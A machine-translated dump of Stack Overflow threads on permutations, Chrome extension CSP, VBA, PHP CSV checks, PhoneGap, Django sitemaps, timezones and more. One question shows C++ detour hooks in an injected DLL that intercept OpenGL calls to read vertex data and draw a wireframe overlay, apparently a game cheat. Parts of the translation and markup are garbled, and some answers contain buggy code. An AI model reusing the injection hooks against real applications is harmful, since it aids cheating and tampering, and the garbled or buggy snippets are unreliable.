
* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-07-04T20:02:18.107

生成排列的标准算法之一是[按字典顺序](http://en.wikipedia.org/wiki/Permutation#Generation_in_lexicographic_order)排列排列的算法。该算法被 C++ 算法的大多数实现所使用，最多`std::next_permutation`在 O(n) 时间排列中生成排列，并跳过所有相互重复的排列。它也非常容易编码。

希望这可以帮助！

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-07-04T20:24:21.010

不是置换原始数字字符串，而是置换数字组。我不知道如何最好地描述它，所以我会尝试一些伪代码。

对于字符串“001222”，数字组是两个 0、一个 1 和三个 2。

```
permute(groups, permutation):
    if there are no non-empty groups
        print permutation
    else
        for each non-empty group
            permutation += group.digit
            --group.count
            permute(groups, permutation) 
```

通过循环组而不是所有数字，它可以避免生成重复，因为每个数字只能为下一个位置选择一次，而不是多次。遍历你得到的随机排列

```
Permutation  Digit Groups

             0: 2, 1: 1, 2: 3  // start
0            0: 1, 1: 1, 2: 3
02           0: 1, 1: 1, 2: 2  // *
021          0: 1, 1: 0, 2: 2  // the 1 group is removed from the set
0212         0: 1, 1: 0, 2: 1
02120        0: 0, 1: 0, 2: 1  // the 0 group is removed from the set
021202       0: 0, 1: 0, 2: 0  // the 2 group is removed from the set 
```

现在展开回 *.

```
02           0: 1, 1: 0, 2: 1 
```

因为您循环的是数字组而不是原始字符串中的所有（重复）数字，所以您不能再次选择 2。这意味着所有以“02”开头的排列都是唯一的，因为前缀“02”只生成一次。这同样适用于整个算法。

**更新**

这是一个快速的 PHP 实现，它为输入“001222”产生 60 个排列：

```
function permute(&$groups, &$count, $permutation) {
    $done = true;
    foreach ($groups as &$group) {
        if ($group[1] > 0) {
            --$group[1];
            permute($groups, $count, $permutation . $group[0]);
            ++$group[1];
            $done = false;
        }
    }       
    if ($done) {
        echo $permutation . PHP_EOL;
        ++$count;
    }
}

$groups = array(
    array(0, 2),
    array(1, 1),
    array(2, 3),
);
$count = 0;
permute($groups, $count, '');
echo "\nTotal: $count\n"; 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-04T20:09:52.687

您可以通过随机选择位数来创建字符串。像这样：

```
length : int - Total string length
digits : int - maximum digit to include in the string
string : String - the return value
for(i : int from 0 to digits)
{
    remainingChars : int = length - length(string) //remaining chars in string
    remainingDigits : int = digits - i + 1
    count : int = Random from 1 to (remainingChars - remainingDigits + 1)
    Append count times i to the string
} 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-07-04T20:19:32.153

我不知道你到底想说什么，但我曾经需要一个排列版本，其中我有一组像 012 这样的数字，所有排列都是：

012 021 102 120 201 210

为了实现这一点，我在维基百科[http://en.wikipedia.org/wiki/Permutation](http://en.wikipedia.org/wiki/Permutation) 上查找了算法，然后我为它创建了一个方法，如下所示：

```
 public static boolean Permute(int[] a) {
        int k, l, n = a.length -1;
        for (k = n -1; ; k--) {
            if (k == -1)
                return false;
            if (a[k] < a[k + 1])
                break;
        }
        for (l = n; l >= 0; l--) {
            if (a[k] < a[l]) {
                int opt = a[l];
                a[l] = a[k];
                a[k] = opt;
                break;
            }
        }
        for (int i = k + 1, j = n; i < j; i++, j--) {
            int opt = a[i];
            a[i] = a[j];
            a[j] = opt;
        }
        return true;
    } 
```

如果您更具体，我可以帮助您

# javascript - Ajax 调用不适用于清单 v2 的 chrome 扩展

> ID：11820694
> 
> 赞同：5
> 
> 时间：2012-08-05T22:43:22.953
> 
> 标签：javascript, jquery, ajax, google-chrome-extension

我正在尝试使用类似这样的基本 chrome 扩展

```
chrome.omnibox.onInputChanged.addListener(function(text, suggest){
       var baseUrl = "http://sample.com";
       var finalResult = [];
              $.ajax({
                     url : baseUrl,
                     dataType : "jsonp",
                     success: function(result) {
                                     for (var i=0; i<result[1].legnth; i++){
                                          finalResult.push(
                                                 {content : result[1][i], description : result[1][i]}
                                          );
                                     }
                                     suggest(finalResult);
                              },
                     async: false
              });           
}); 
```

这适用于清单版本 1，但是当我将其更改为 v2 时，我收到以下错误。我会很感激任何帮助:)

拒绝加载脚本“http://sample.com”，因为它违反了以下内容安全策略指令：“script-src 'self' chrome-extension-resource:”。

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-08-05T23:10:23.483

您应该阅读[内容安全政策](http://developer.chrome.com/extensions/contentSecurityPolicy)

完成清单文件：

```
 "content_security_policy": "script-src 'self' http://sample.com; object-src 'self'", 
```

# vba - 如何使用 VBA 在 excel 单元格中获取月份和日期？

> ID：11820695
> 
> 赞同：1
> 
> 时间：2012-08-05T22:43:25.043
> 
> 标签：vba, date, excel

所以这是我的场景：

我有一个 Cisco 登录和注销报告，可以将我的数据导出到 Excel 中。伟大的！唯一的问题是它在一天内给了我多次登录时间，所以我试图只进行第一次登录尝试，然后在那天把其余的都扔掉，然后转到下一天。

该单元格由 Cisco 预先格式化为`m/d/yyyy" "h\:mm\:ss AM/PM`. 我正在自学 VBA，我想从该单个单元格中获取 m/d/yyyy，并将其与其他单元格进行比较。如果日期存在，我想删除这些行。

例子：

```
5/2/2012 2:55:12PM
5/2/2012 3:00:00PM
5/2/2012 3:01:00PM
5/3/2012 2:56:01PM 
```

我想删除 for 循环中的第二个和第三个条目。

如果不清楚，请告诉我，非常感谢您的帮助！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-05T23:43:25.563

您提到`preformatted by Cisco as m/d/yyyy" "h\:mm\:ss AM/PM.`上面的示例与该格式不匹配。您提供的样品应该是

```
5/2/2012 2:55:12 PM
5/2/2012 3:00:00 PM
5/2/2012 3:01:00 PM
5/3/2012 2:56:01 PM 
```

即前面有一个空格`PM`

下面的代码示例基于格式`m/d/yyyy h\:mm\:ss AM/PM`

**代码**

```
Sub Sample()
    Dim ws As Worksheet
    Dim lRow As Long, i As Long
    Dim delRange As Range

    '~~> Set this to the sheet where you have the data
    Set ws = Sheets("Sheet1")

    With ws
        '~~> Sort the data in ascending order
        .Range("A:A").Sort key1:=.Range("A1"), order1:=xlAscending

        '~~> Get the last row
        lRow = .Range("A" & .Rows.Count).End(xlUp).Row

        '~~> loop through the cells
        For i = 2 To lRow
            '~~> Check if date matches
            If Application.Evaluate("=DATE(YEAR(A" & i & "),MONTH(A" & i & "),DAY(A" & i & "))") = _
            Application.Evaluate("=DATE(YEAR(A" & i - 1 & "),MONTH(A" & i - 1 & "),DAY(A" & i - 1 & "))") Then
                '~~> Check if the value is greater
                If .Range("A" & i).Value > .Range("A" & i - 1).Value Then
                    '~~> identify cells to delete
                    If delRange Is Nothing Then
                        Set delRange = .Range("A" & i)
                    Else
                        Set delRange = Union(delRange, .Range("A" & i))
                    End If
                End If
            End If
        Next i

        '~~> Delete cells
        If Not delRange Is Nothing Then delRange.Delete
    End With
End Sub 
```

**截屏**

![在此处输入图像描述](../Images/8da33da504d7d364a2c79aff599ab611.png)

# php - 使用PHP计算CSV文件中的列数？

> ID：11820696
> 
> 赞同：-4
> 
> 时间：2012-08-05T22:43:44.777
> 
> 标签：php, mysql

在我将数据转储到 MYSQL 数据库之前是否可以验证文本文件？

我想检查它是否包含 5 列（数据）。如果是这样，那么我继续进行以下查询：

```
LOAD DATA CONCURRENT INFILE 'c:/test/test.txt' 
INTO TABLE DUMP_TABLE FIELDS TERMINATED BY '\t' ENCLOSED BY '' LINES TERMINATED BY '\n' ignore 1 lines. 
```

如果没有，我删除整行。我对 txt 文件中的所有行重复此过程。

文本文件包含以下格式的数据：

```
id  col2    col3    2012-07-27-19:27:06 col5

id  col2    col3    2012-07-25-09:58:50 col5

id  col2    col3    2012-07-23-10:14:13 col5 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-05T22:51:51.390

编辑：阅读您的评论后，这是对制表符分隔数据执行相同操作的代码：

```
$handler = fopen("myfile.txt","r");
$error = false;
while (!feof($handler)){
   fgets($handler,$linetocheck);
   $cols = explode (chr(9), $linetocheck); //edit: using http://es.php.net/manual/en/function.fgetcsv.php you can get the same result as with fgets+explode
   if (count($cols)>$max_cols){
       $error=true;
       break;
   }
}
fclose($handler);
if (!$error){
    //...do stuff
} 
```

这段代码逐行读取文件，比如“myfile.txt”，如果任何行的长度超过 $max_cols，则将变量 $error 设置为 true。（如果这不是你要问的，我很抱歉，你的问题对我来说不是最清楚的）

```
$handler = fopen("myfile.txt","r");
$error = false;
while (!feof($handler)){
   fgets($handler,$linetocheck);
   if (strlen($linetocheck)>$max_cols){
       $error=true;
       break;
   }
}
fclose($handler);
if (!$error){
    //...do stuff
} 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2020-06-19T17:04:30.883

我知道这是一个旧线程，但我自己也在寻找类似的东西，我遇到了这个话题，但这里提供的答案都没有帮助我。

因此，我继续前进并提出了我自己的解决方案，该解决方案经过测试并且可以完美运行（可以改进）。

假设我们有一个名为的 CSV 文件`example.csv`，其中包含以下虚拟数据（故意地，最后一行第 6 行包含一个额外数据，然后是其他行）：

```
Name,Country,Age
John,Ireland,18
Ted,USA,22
Lisa,UK,23
Michael,USA,20
Louise,Ireland,22,11 
```

现在，当我们检查 CSV 文件以确保所有行都具有相同数量的数据时，以下代码块将起到作用并指出错误发生在哪一行：

```
 function validateCsvColumnLength($pathToCsvFile)
    {
        if(!file_exists($pathToCsvFile) || !is_readable($pathToCsvFile)){
            throw new \Exception('Filename doesn`t exist or is not readable.');
        }

        if (!$handle = fopen($pathToCsvFile, "r")) {
            throw new \Exception("Stream error");
        }

        $rowLength       = [];
        $rowNumber       = 0;
        while (($data    = fgetcsv($handle)) !== FALSE) {
            $rowLength[] = count($data);
            $rowNumber++;
        }
        fclose($handle);

        $rowKeyWithError   = array_search(max($rowLength), $rowLength);
        $differentRowCount = count(array_unique($rowLength));

        // if there's a row that has more or less data, throw an error with the line that triggered it
        if ($differentRowCount !== 1) {
            throw new \Exception("Error, data count from row {$rowKeyWithError} does not match header size");
        }
        return true;
    } 
```

要实际测试它，只需执行 var_dump() 即可查看结果：

```
 var_dump(validateCsvColumnLength('example.csv')); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-05T22:56:26.123

Yes, it is possible. I've done that exact thing. Use PHP's csv processing functions.

You will need these functions:

fopen() fgetcsv()

And possibly some others.

fgetcsv returns an array.

I'll give you a short example of how you can validate.

here's the csv: col1,col2,col3,col4 1,2,3,4 1,2,3,4, 1,2,3,4,5 1,2,3,4

I'll skip the fopen part and go straight to the validation step. Note that "\t" is the tab character.

```
$row_length;
$i = 0;
while($row = fgetcsv($handle,0,"\t") {
  if($i == 0) {
    $row_length = sizeof($row);
  } else {
    if(sizeof($row) != $row_length) {
      echo "Error, line $i of the data does not match header size";
      break;
    }
  }
} 
```

That would test each row to make sure it is the same as the 1st row's ($i = 0) length.

EDIT: And, in case you don't know how to search the internet, here is the page for fgetcsv: [http://php.net/manual/en/function.fgetcsv.php](http://php.net/manual/en/function.fgetcsv.php)

Here is the function prototype: array fgetcsv ( resource $handle [, int $length = 0 [, string $delimiter = ',' [, string $enclosure = '"' [, string $escape = '\' ]]]] )

As you can see, it has everything you would need for doing a quick scan in PHP before you send your data to LOAD DATA IN FILE.

I have solved your exact problem in my own program. My program also automatically eliminates duplicate rows and other cool stuff.

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-08-05T22:46:34.140

你的意思是什么列？如果您只是指行中的字符数，只需将 ( `explode`) 文件拆分为多行并检查它们的长度是否等于 5。

~~`fgetcsv`如果您的意思是带有分隔符的列，那么您应该在每一行中找到该拆分器的出现次数，然后再次检查它们是否~~等于 5。~~用于~~

 ~~* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-08-05T22:46:52.033

你可以试试看是否[`fgetcsv`](http://php.net/fgetcsv)够用。如果不是，请对列的含义进行更多描述。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2012-08-05T22:48:42.067

我假设您在谈论文件中每一行的长度。如果是这样，这是一个可能的解决方案。

```
$file_handle = fopen("myfile", "r");
while (!feof($file_handle)) {
   $line = fgets($file_handle);
   if(strlen($line)!=5) {
       throw new Exception("Could not save file to database.");
       break;
   }
}
fclose($file_handle); 
```~~

# java - Java 平滑 ArrayList 运动

> ID：11820697
> 
> 赞同：3
> 
> 时间：2012-08-05T22:43:48.297
> 
> 标签：java, arraylist, smooth-scrolling

目前我在我的程序中使用双缓冲（尽管你应该知道），并且我有一个存储 BufferedImages 和 Integers 的数组列表。目前我在屏幕上移动整个数组列表的代码是：

```
 public static void MoveMap(final double ammount){
    Thread t = new Thread(){
        public void run(){
            for(int i = 0; i < TileHelper.MAIN_LIST.size();i++){
                    TileHelper.MAIN_LIST.get(i).changeX(ammount*DATA.speed);
            }
        }
    };
    t.start();
} 
```

这可以完成工作，但看起来并不顺利。即使我使用 0.25 之类的数字作为可变数量。（我只是注意到我在代码中拼写错误：O）如果我的所有图像都在这个数组中，我如何做出漂亮的平滑运动？顺便说一句，如果您想知道这有什么不顺利，这是因为它滞后并且在每张图像之间您会看到一个很大的空白区域。感谢您提供任何帮助...谢谢！

渲染代码：

```
public class Main extends JFrame {
public static int worldsize = 1080;
private static final long serialVersionUID = 6149918602875295087L;
public static void main(String args[]){
    new Main();
}
TileHelper tiles = new TileHelper(TileHelper.MAIN_LIST);
public Main(){

    DATA_IMAGES.initImages();

    addDefaultBlocks();
    setSize(640,480);
    setResizable(false);
    setTitle("Stranded");
    setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
    setLocationRelativeTo(null);

    setVisible(true);

    createBufferStrategy(2);
    GameLoop();
    addKeyListener(new KeyListener() {
        public void keyTyped(KeyEvent e) {

        }

        public void keyReleased(KeyEvent e) {

        }

        public void keyPressed(KeyEvent e) {
            int key = e.getKeyCode();

            switch(key){
            case KeyEvent.VK_LEFT:
                Movement.MoveMap(3.25);
                break;
            case KeyEvent.VK_RIGHT:
                Movement.MoveMap(-3.25);
                break;
            case KeyEvent.VK_UP:
                DATA.speed++;
                break;
            case KeyEvent.VK_DOWN:
                DATA.speed--;
                break;
            case KeyEvent.VK_SPACE:
                System.out.println(DATA.speed);
                break;
            }
        }
    });
}
private void addDefaultBlocks() {   
    for(int x = -1000/32; x < worldsize/32; x++){
        for (int y = -1000/32; y < worldsize/32; y++){
            TileHelper.addBlock(DATA_IMAGES.GRASS, x*32, y*32);
        }
    }
}
public void GameLoop(){
    Thread gameloop = new Thread(){
        public void run(){
            while(true){
                RenderInit();
                try {
                    Thread.sleep(30);
                } catch (InterruptedException e) {
                    e.printStackTrace();
                }
            }
        }
    };
    gameloop.start();
}
public void RenderInit(){
    BufferStrategy buff = getBufferStrategy();
    Graphics g = buff.getDrawGraphics();

    g.clearRect(0, 0, getWidth(), getHeight());

    Render(g);

    g.dispose();
    buff.show();
    Toolkit.getDefaultToolkit().sync();
}
public void Render(Graphics g){
    tiles.RenderAll(g);
} 
```

}

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-05T22:50:19.303

我假设你正在尝试制作一个横向卷轴游戏，而我让它工作的方式是制作游戏中的所有对象，一个精灵。

我创建了一个 Sprite 类，其中包含 x、y、xvelocity、yvelocity 属性以及 getter 和 setter。当我想滚动时，我要么暂时将速度设置为相反的方向，要么移动 x 值。

另一种方法是保持原始 x 和 y 值存储在每个精灵中，当绘制到屏幕上时，我有一个名为：“offSetX”的变量，它被精灵的原始位置添加或减去，以便在所有精灵之间统一移动屏幕。

如果这不是您要查找的内容，我将删除此内容。:)

注意：我最近修改了我的旧横向卷轴游戏引擎，发现最后一种方法是最好的，而不是修改精灵列表上的所有 x 位置。我的 offSetX 变量是一个浮点值，当绘制到屏幕上时，我使用 Math.round(sprite.getX() + offSetX) 来获得最准确的位置。

# git - 无法部署到heroku，因为带有指纹的密钥未经授权

> ID：11820704
> 
> 赞同：2
> 
> 时间：2012-08-05T22:44:52.663
> 
> 标签：git, deployment, heroku, ssh-keys, fingerprint

我有一个 git 存储库，我想从单个存储库中获得 2 个 heroku 应用程序 - 生产和登台。对于生产应用程序，我是协作者（不是所有者）。对于分期，我想成为所有者。

我在命令行中完成了以下操作：

```
heroku create app-staging-name
git remote add staging git-repo-address-given
git push staging master 
```

它给了我错误：

```
!  Your key with fingerprint xx:xx:xx:xx:xx:xx is not authorized to access app-staging-name. fatal: The remote end hung up unexpectedly. 
```

我还[向 heroku 添加了一个新的 SSH 密钥](https://devcenter.heroku.com/articles/keys)。如何在没有指纹冲突的情况下从同一个 git repo 部署 2 个 heroku 应用程序？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-13T11:23:19.760

我必须使用这些步骤来清除 heroku 密钥，然后创建一个并添加它。

```
heroku keys:clear
ssh-keygen -t rsa # put the new name as /Users/username/.ssh/id_rsa_appname
heroku keys:add 
```

# android - 在 PhoneGap 中禁用文本选择

> ID：11820708
> 
> 赞同：33
> 
> 时间：2012-08-05T22:45:06.500
> 
> 标签：android, cordova, textselection

是否可以禁用文本选择以使 PhoneGap 应用程序更类似于普通的原生应用程序？

像这样的东西：

```
document.onselectstart = function() {return false;} 
```

或者：

```
* { 
user-select: none;
-moz-user-select: -moz-none;
-khtml-user-select: none;
-webkit-user-select: none;
} 
```

或者许多其他的东西不起作用。

* * *

## 回答 #1

> 赞同：59
> 
> 时间：2012-08-06T06:53:00.477

穿上它`html`，而不是`*`，对我有用：

```
html {
    -webkit-user-select: none;
} 
```

* * *

## 回答 #2

> 赞同：32
> 
> 时间：2012-08-08T20:31:46.650

我四处寻找帮助。这终于对我有用。

```
public class MainActivity extends DroidGap {

    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        super.loadUrl("file:///android_asset/www/index.html");

        super.appView.setOnLongClickListener(new View.OnLongClickListener() {

            public boolean onLongClick(View v) {
                return true;
            }
        });
    }
} 
```

setOnClickListener 有什么魔力。确保在调用 super.loadUrl 之后放置它。

当然，这将禁用整个应用程序的文本选择，但我对此表示满意，而且我目前没有任何其他方法可以解决它。

我还不确定它的完整含义，但我确实使用了 JqueryMobile 事件“taphold”，它仍然可以正常工作。我相信这可以通过处理对 appView（托管您的 HTML 应用程序）的长按并防止它冒泡来实现。

* * *

## 回答 #3

> 赞同：9
> 
> 时间：2014-03-26T13:21:35.533

这也可以。

```
<body oncontextmenu="return false" ondragstart="return false" 
onselectstart="return false"> 
```

* * *

## 回答 #4

> 赞同：8
> 
> 时间：2012-08-06T13:14:41.130

除了 ThinkingStiff 提到的内容外，我还使用以下内容删除任何突出显示/复制和粘贴

```
-webkit-touch-callout: none;
-webkit-tap-highlight-color: rgba(0,0,0,0); 
```

* * *

## 回答 #5

> 赞同：6
> 
> 时间：2015-10-14T05:56:56.907

添加这个并享受。也适用于 iOS。

```
<style type="text/css">
*:not(input,textarea) {
    -webkit-touch-callout: none;
    -webkit-user-select: none; /* Disable selection/Copy of UIWebView */
}
</style> 
```

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2017-09-04T03:59:19.080

我使用了下面的代码，它在 Android 和 iOS 设备以及模拟器/模拟器上运行良好：

```
 * {
    -webkit-user-select: none;
    -khtml-user-select: none;
    -moz-user-select: none;
    -ms-user-select: none;
    user-select: none;
    }

   input, textarea {
    -webkit-user-select: auto !important;
    -khtml-user-select: auto !important;
    -moz-user-select: auto !important;
    -ms-user-select: auto !important;
    user-select: auto !important;
    } 
```

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2014-04-24T17:02:43.530

最近更新到 Android 4.4 kitkat，它解决了 Edittext 在点击（长按）时出现的问题。显然edittext没有出现在带有jquery mobile和android 4.4上的phonegap的taphold上。我正在使用自定义 aosp rom，因此尚未在官方版本上进行测试，但我猜测（并希望）它应该适用于任何 4.4 版本。它似乎也解决了我在下面发布的 onclick 的其他冲突。

我发现较旧的方法适用于较旧的 ICS rom（仅在 4.0.4 自定义 rom 上测试）。
通过添加滚动条

例子：

```
<div id="scroll">content</div> 

<style>
#scroll {

height: 100%;
width: 100%;
}
</style> 
```

它还禁止 EditText 在 phonegap 和 jquery mobile 上弹出点击（长按）。尚不确定这是否会导致任何冲突（似乎对正在整理的 onclick 有一些影响），但使用常规文本应该可以正常工作。--- 使用 Android 4.4 解决的问题并且不再需要滚动。（见帖子顶部）

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2016-09-26T15:04:37.203

对我来说这是最好的：

```
-webkit-tap-highlight-color: rgba(0,0,0,0); 
tap-highlight-color: rgba(0,0,0,0); 
```

我的案例发生在 pixi.js 上，与

```
plugins.interaction.autoPreventDefault = true; 
```

* * *

## 回答 #9

> 赞同：-1
> 
> 时间：2017-04-23T20:27:54.387

```
* {
    -webkit-touch-callout: none;
    -webkit-user-select: none; 
}

[contenteditable="true"] , input, textarea {
    -webkit-user-select: auto !important;
    -khtml-user-select: auto !important;
    -moz-user-select: auto !important;
    -ms-user-select: auto !important;
    -o-user-select: auto !important;
    user-select: auto !important;  
} 
```

# actionscript-3 - JW 播放器时间滑块

> ID：11820712
> 
> 赞同：1
> 
> 时间：2012-08-05T22:46:02.150
> 
> 标签：actionscript-3, jwplayer

我想像在 youtube 上一样将*JW 时间滑块放在控制栏的顶部。*

我正在尝试编辑`JW`源以实现此目的，但找不到它声明这 3 个位置（`'left'`, `'center'`, `'right'`）的位置并添加我自己的位置。

*我必须从哪里开始寻找这个？*

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2015-03-25T00:07:12.677

您将需要编辑 Slider.as、ControlbarLayoutManager.as

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-09-09T07:22:54.127

请参阅 jwplayer[构建您自己的皮肤页面](http://www.longtailvideo.com/support/jw-player/28849/skin-xml-reference)。愿这对你有所帮助。

# xml - 如何将 XSLT 引用插入 Django 生成的站点地图

> ID：11820713
> 
> 赞同：1
> 
> 时间：2012-08-05T22:46:14.727
> 
> 标签：xml, django, xslt, seo, sitemap

我正在使用 django 并使用站点地图框架来构建我的 xml 站点地图。Google 的 SEO 指南建议除了 xml 站点地图之外还有一个 HTML 站点地图，所以我正在构建一个。

话虽如此，我想简单地构建一个 XSLT 并从站点地图 xml 中引用它。基本上，我正在尝试这样的事情：

1.  转到 /sitemap.xml，您会看到站点地图 xml
2.  转到 /sitemap 并为您提供相同的 xml，只是引用了 xsl 表，这将导致 html 被呈现。

这应该很容易维护，因为我不需要做任何事情来维护 html 页面。

关于如何用 django 做到这一点的任何想法？我现在最好的想法是覆盖默认站点地图视图并使用 python 在生成的 xml 中插入 xsl 引用。还有其他方法吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-06T23:02:13.333

只需自定义站点地图模板：[https](https://docs.djangoproject.com/en/1.3/ref/contrib/sitemaps/#template-customization) ://docs.djangoproject.com/en/1.3/ref/contrib/sitemaps/#template-customization并使用 html 站点地图的特殊 url 并在标题中引用 XSLT。

默认模板位于 django/contrib/sitemaps/templates [https://github.com/django/django/tree/master/django/contrib/sitemaps/templates](https://github.com/django/django/tree/master/django/contrib/sitemaps/templates)

当然，您会将它们添加到您自己的模板文件夹中。

# c++ - OpenGL 挂钩顶点缓冲区

> ID：11820715
> 
> 赞同：1
> 
> 时间：2012-08-05T22:46:22.143
> 
> 标签：c++, opengl

情况：我正在注入一个使用顶点缓冲区来渲染模型的应用程序。我想获得每个模型的每个顶点的确切坐标。我使用弯路来跟踪传递给客户的信息。基本上所有信息在到达该应用程序之前都会先通过我。

问题：我已经截获了所有的OpenGL调用，如何获取顶点缓冲区数据？

我的代码如下所示：

```
struct BufferObject  //My struct to hold all data gathered.
{
    GLint ID;
    GLsizei Size;
    GLboolean Reserved;
    GLenum Type, Usage;
    const GLvoid* BufferPointer;
};

BufferObject CurrentBuffer;
std::vector<BufferObject> ListOfBuffers;

DLL_EXPORT __stdcall void MyHook_glBindBufferARB(GLenum target, GLuint buffer)
{
    BufferBound = true;
    CurrentBuffer.Type = target;  //Save what kind of buffer it is.
    CurrentBuffer.ID = buffer;    //Save the buffer ID.

    (*original_glBindBufferARB) (target, buffer);
}

DLL_EXPORT __stdcall void MyHook_glBufferDataARB(GLenum target, GLsizeiptrARB size, const GLvoid *data, GLenum usage)
{
    if (BufferBound && CurrentBuffer.Type == target && target == GL_ARRAY_BUFFER)   //If it's vertices, save them.. All the X, Y, Z's.
    {
        BufferBound = false;
        CurrentBuffer.Size = size;   //Save the buffer size.
        CurrentBuffer.BufferPointer = data; //Not sure if to do this or to use memcpy or what.. :S
        CurrentBuffer.Usage = usage;  //Save it's usage.
        ListOfBuffers.push_back(CurrentBuffer);  //Add the current buffer to the list.
    }
    (*original_glBufferDataARB) (target,  size, data, usage);
}

DLL_EXPORT __stdcall void MyHook_glVertexPointer(GLint size, GLenum type, GLsizei stride, const GLvoid *pointer)
{
    ModelRendering = true;
    CurrentModel.Stride = stride;  //A model is being rendered so save it's stride.
    CurrentModel.NullVertex = (pointer == NULL);
    CurrentModel.VertexPointer = pointer;   //This seems to always be NULL.
    ListOfModels.push_back(CurrentModel);

    (*original_glVertexPointer) (size, type, stride, pointer);
}

DLL_EXPORT __stdcall void MyHook_glDrawElements(GLenum mode, GLsizei count, GLenum type, const GLvoid *indices)
{
    if (ModelRendering)  //If one of the models I'm tracking is being rendered.
    {
        Model* ModelPtr = &ListOfModels.back();
        ModelPtr->ID = 0;
        ModelPtr->TriangleCount = count / 3;    //Should be correct.

        if (!ModelPtr->NullVertex)  //If vertexpointer was not null.
        {
            const GLfloat* Pointer = static_cast<const GLfloat*>(ModelPtr->VertexPointer); //Should be used to iterate each vertex? Gotten from vertex pointer..
            ModelPtr->X = *Pointer + ModelPtr->Stride;
            ModelPtr->Y = *Pointer + ModelPtr->Stride + sizeof(GLfloat);    //I think?
            ModelPtr->Z = *Pointer + ModelPtr->Stride + (2 * sizeof(GLfloat));
        }
        else        //It's rendering from the vertex buffer.. This is what I need.
        {
            ModelPtr->X = *(ListOfBuffers[CurrentBuffer.ID].BufferPointer) + ModelPtr->Stride;
            ModelPtr->Y = *(ListOfBuffers[CurrentBuffer.ID].BufferPointer) + ModelPtr->Stride + sizeof(GLfloat);
            ModelPtr->Z = *(ListOfBuffers[CurrentBuffer.ID].BufferPointer) + ModelPtr->Stride + sizeof(GLfloat);
        }

        if ((ModelPtr->Stride == Stride) && Overlay)
            original_glPolygonMode(GL_FRONT_AND_BACK, GL_LINE);
        else
            original_glPolygonMode(GL_FRONT_AND_BACK, GL_FILL);
    }
    else
        original_glPolygonMode(GL_FRONT_AND_BACK, GL_FILL);
    (*original_glDrawElements) (mode, count, type, indices);
} 
```

我使用了一个结构来保存我为每个缓冲区收集的所有数据，并使用一个向量来保存所有缓冲区的列表。我怎样才能得到数据呢？它必须是可能的，因为 gDEBugger 可以做到：S。

这就是应用程序的作用：

```
//Creates a buffer and stores data in it.
glGenBuffersARB(1, 0x0BAD9664)
glBindBufferARB(GL_ARRAY_BUFFER, 49)
glBufferDataARB(GL_ARRAY_BUFFER, 97996, 0x266AF026, GL_STATIC_DRAW)

//Calls buffer 49 and starts to draw it.
glBindBufferARB(GL_ARRAY_BUFFER, 49)
glVertexPointer(3, GL_FLOAT, 24, 0x00000000)
glEnableClientState(GL_VERTEX_ARRAY)
glDisableClientState(GL_NORMAL_ARRAY)
glColorPointer(4, GL_UNSIGNED_BYTE, 24, 0x0000000C)
glBindBufferARB(GL_ELEMENT_ARRAY_BUFFER, 56)
glDrawElements(GL_TRIANGLES, 1326, GL_UNSIGNED_SHORT, 0x00000000); 
```

# php - 将 UTC 偏移量转换为时区或日期

> ID：11820718
> 
> 赞同：21
> 
> 时间：2012-08-05T22:46:40.957
> 
> 标签：php, geolocation, timezone, timezone-offset

给你一个挠头。

我正在从[IPInfoDB](http://ipinfodb.com)的 API 获取地理 IP 数据，它返回与 UTC 的时区偏移量，**包括**DST（如果当前已反映）。

例如，我住在 EST (-5)，目前是 DST，所以地理 IP API 返回 ( `-04:00`) 作为偏移量。

这太棒了，因为 DST 令人头疼。但令我惊讶的是，它引起了另一个头痛。

我在 PHP 中加载这些数据以通过 AJAX 传递给应用程序。我想在应用程序上获得 IP 地址的实时本地时间。

我已经完美地设置了这一切，但我疯狂地试图弄清楚如何设置 PHP 时区以匹配偏移量，这样我就可以抓住当前的小时`date('H');`和分钟`date('i');`来通过 AJAX 传递。

我不确定是否有一个特定的函数可以根据该偏移量给我当前的小时和分钟，或者是否有一种实用的方法可以根据偏移量设置时区（如果有效，则已经应用了 DST） .

我一直在搜索和搜索谷歌以找到答案，但我正在做的更具体，因为 DST 已经应用。

我在[PHP.net](http://php.net)上找到了一个似乎可以解决问题的函数（它适用于我的时区并返回正确的时间），尽管对于 PST 等其他时区，即使偏移量正确，它也会比应有的时间晚 1 小时返回（`-07:00`与夏令时）。

从函数返回的时区是`Chile/EasterIsland`我感觉的原因。如果可以的话，我会让它只适用于美国，但我确实需要它在全球范围内。

这是我现在拥有的功能。请原谅非常混乱的代码。在过去的几个小时里，我一直在玩很多东西，试图找出解决方案。

大部分功能都是在网上找到的。

```
function offsetToTZ($offset) {
switch((string) $offset) {
    case '-04:30' : return 'America/Caracas'; break;
    case '-03:30' : return 'Canada/Newfoundland'; break;
    case '+03:30' : return 'Asia/Tehran'; break;
    case '+04:30' : return 'Asia/Kabul'; break;
    case '+05:30' : return 'Asia/Kolkata'; break;
    case '+05:45' : return 'Asia/Kathmandu'; break;
    case '+09:30' : return 'Australia/Darwin'; break;
}
$offset = (int) str_replace(array('0',0,':00',00,'30',30,'45',45,':','+'),'', (string) $offset);

$offset = $offset*60*60;
$abbrarray = timezone_abbreviations_list(); 
foreach ($abbrarray as $abbr) { 
    foreach($abbr as $city) { 
        if($city['offset'] == $offset) { 
            return $city['timezone_id'];
        }
    }
}
return false; 
} 
```

